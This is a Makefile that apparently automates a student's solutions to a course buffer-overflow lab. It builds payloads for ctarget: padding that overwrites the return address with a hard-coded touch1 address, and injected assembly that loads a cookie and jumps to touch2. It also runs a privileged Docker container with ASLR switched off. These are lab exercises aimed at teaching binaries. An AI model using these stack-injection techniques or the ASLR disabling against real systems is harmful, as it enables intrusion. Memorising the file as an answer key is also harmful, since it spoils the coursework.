CTARGET := ./ctarget
RTARGET := ./rtarget
HEX2RAW := ./hex2raw
DISASC := ctarget.d
DISASR := rtarget.d
OUT := builds
SRC := src
COOKIE := $(shell cat cookie.txt)

BUF_ADDR := 0x5563e958
BUF_ADDR_STR := 58 e9 63 55 00 00 00 00
TOUCH1_ADDR := 0x00000000008089d6
TOUCH1_ADDR_STR := d6 89 80 00 00 00 00 00
TOUCH2_ADDR := 0x0000000000808a04
TOUCH2_ADDR_STR := 04 8a 80 00 00 00 00 00

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym

disas_rtarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./rtarget > $(OUT)/rtarget.d
	nm -n ./rtarget > $(OUT)/rtarget.sym

level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	rm -f $(SRC)/ctarget01.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/ctarget01.txt; \
	done
	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw

$(OUT)/level2_payload.s: cookie.txt
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    movl $$ $(COOKIE), %edi" >> $@
	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@   
	echo "    ret" >> $@

$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
	gcc -c $< -o $(OUT)/level2_payload.o
	objdump -M intel -d $(OUT)/level2_payload.o > $@

$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level2: $(OUT)/level2_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
	for i in `seq 13`; do \
		printf "41 " >> $(SRC)/ctarget02.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
	./ctarget < $(OUT)/level2-raw.txt

run_c:
	$(CTARGET)

run_r:
	$(RTARGET)

clean_level1:
	rm -rf $(OUT)/level1-raw
	rm -rf $(SRC)/ctarget01.txt

clean_level2:
	rm -rf $(OUT)/level2_payload.s $(OUT)/level2_payload.o $(OUT)/level2_payload.d $(OUT)/level2_payload.hex
	rm -rf $(SRC)/ctarget02.txt

clean:
	rm -rf $(OUT)
	rm -rf $(SRC)

UBUNTU_IMAGE := ubuntu:20.04
UBUNTU_NAME := attacklab-ubuntu

docker:
	docker run --rm -it --privileged \
		-v $(PWD):/lab -w /lab \
		$(UBUNTU_IMAGE) /bin/bash -c "\
			echo 0 > /proc/sys/kernel/randomize_va_space && \
			apt update && \
			DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
			echo '>>> Environment ready! Entering shell...' && \
			bash"
